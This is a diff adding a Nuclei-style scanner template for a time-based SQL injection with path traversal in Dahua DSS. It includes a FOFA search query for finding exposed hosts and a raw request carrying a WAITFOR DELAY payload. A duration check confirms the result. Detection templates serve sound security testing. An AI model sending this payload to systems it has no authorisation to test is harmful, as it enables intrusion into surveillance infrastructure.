@@ -1,0 +1,28 @@
+id: dh-getNewStaypointDetailQuery-sql
+
+info:
+  name: dh-getNewStaypointDetailQuery-sql
+  author: lengmo
+  severity: high
+  description: dh-getNewStaypointDetailQuery-sql
+  tags: sqli
+  metadata:
+    fofa-qeury: app="dahua-DSS"
+    veified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+               
+    matchers:     
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && duration>=5 && duration<=8&& contains(header,'Apache-Coyote')" 
